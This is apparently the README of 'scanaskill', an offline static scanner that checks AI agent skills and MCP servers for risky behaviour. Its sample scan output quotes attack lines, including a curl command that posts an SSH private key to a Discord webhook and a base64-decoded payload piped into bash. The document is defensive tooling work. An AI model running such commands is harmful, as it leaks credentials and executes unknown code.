<div align="center">

# 🛡️ scanaskill

Deterministic security scanner for AI agent skills.

Scan Claude Skills, MCP servers, Cursor rules, GitHub Actions, and other agent
artifacts to see what they actually do before installing them.

Offline. Pure Python stdlib. Executes nothing.

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-39%20passing-brightgreen)](#)
[![stdlib](https://img.shields.io/badge/deps-0-blueviolet)](#)

</div>

---

# Why this exists

Agent skills are becoming another software dependency.

They can run shell commands, install packages, clone repositories, access your
files, or send data over the network. Most of them are installed directly from
GitHub with very little review.

Recent incidents have shown this isn't theoretical anymore.

Snyk's **ToxicSkills** audit of nearly four thousand public skills found that
over a third contained security issues, including dozens with intentionally
malicious behavior. The **Clinejection** incident demonstrated how prompt
injection could chain into an npm supply-chain compromise.

We have tools like `npm audit`, `cargo audit`, and `pip-audit` for packages.

There wasn't an equivalent for AI skills.

scanaskill fills that gap.

It doesn't execute anything. It doesn't try to decide whether something is
malicious. It simply tells you what the artifact contains so you can inspect it
before trusting it.

---

# What we found

We scanned 4,000 randomly selected public skills from 174 repositories
(8,850 collected, 8,414 unique after deduplication).

| Signal | % of skills |
|---|---|
| No recognizable license | **93.6%** |
| Invokes shell or interpreter | **75.3%** |
| Supply-chain behavior (curl\|bash, unpinned installs) | **23.1%** |
| Credential-format strings | **14.7%** |
| Destructive filesystem operations | **7.6%** |
| Exfiltration sinks | **4.2%** |
| Prompt manipulation patterns | **3.3%** |
| Obfuscation chains | **0.4%** |
| High or critical findings | **18.0%** |

Almost one in five skills contained at least one high or critical finding.

The complete methodology is available in
[`CORPUS-REPORT.md`](CORPUS-REPORT.md).

---

# Installation

No installation required.

```bash
git clone https://github.com/baldbee/scanaskill
cd scanaskill
python3 -m scanaskill ~/.claude/skills
```

Python 3.8+ only.

---

# Usage

```bash
python3 -m scanaskill <dir>

python3 -m scanaskill <dir> --json

python3 -m scanaskill <dir> --sarif

python3 -m scanaskill <dir> --severity high

python3 -m scanaskill <dir> --max-findings 0
```

Exit codes:

- **0** — no findings at or above the selected threshold
- **1** — findings detected
- **2** — invalid usage

---

# Example

```text
$ python3 -m scanaskill suspicious-skill

scanaskill 0.2.0
Scanned 1 artifact
14 findings

CRITICAL  Local secret read piped to network
SKILL.md:41

curl -d @~/.ssh/id_rsa https://discord.com/api/webhooks/...

CRITICAL  AWS Access Key
SKILL.md:24

AKIA...

CRITICAL  base64 decode piped into shell
SKILL.md:52

echo '...' | base64 -d | bash

HIGH      curl | bash
SKILL.md:12
```

---

# Checks

scanaskill currently looks for:

- shell execution
- filesystem operations
- network access
- embedded secrets and credentials
- license information
- supply-chain behavior
- prompt manipulation patterns
- exfiltration paths
- obfuscation
- configuration tampering

Supported artifacts include Claude Skills, MCP servers, Cursor rules,
GitHub Actions, npm packages, context files, and generic repositories.

---

# Design

### It reports observations

Every finding points to a specific file and line.

The scanner never labels a project as malicious or safe. Those are human
judgments.

### It is deterministic

Everything is based on parsing, regexes, entropy checks, and static analysis.

Running the scanner twice on the same files produces the same report.

### It executes nothing

No sandbox.

No API calls.

No telemetry.

No model.

It never runs the artifact being scanned.

### It is built to avoid noisy reports

Common placeholders such as `YOUR_API_KEY`, example secrets, environment
variables, and license boilerplate are ignored.

The test suite also includes parity tests to ensure performance optimizations
don't change findings.

---

# Performance

Scanning a single skill is effectively instantaneous.

A corpus of roughly four thousand skills completes in about four and a half
minutes on a laptop using process parallelism.

Large files are capped to keep scans predictable.

---

# Development

```bash
python3 -m unittest discover -s tests -v
```

39 tests.

Pure Python standard library.

---

# Roadmap

The scanner is free.

The long-term product is verification.

1. Local scanner.
2. Public verification reports tied to commits.
3. Continuous verification with rescans when artifacts change.
4. Enterprise attestation for organizations.

The goal is to be an independent auditor, not another skill marketplace.

---

# License

MIT © baldbee

---

*Independent project. Not affiliated with Anthropic, Snyk, or any vendor.
Patterns modeled on gitleaks/trufflehog (secrets), OWASP Agentic Top 10,
MCPGuard threat taxonomy, and Snyk's ToxicSkills findings.*
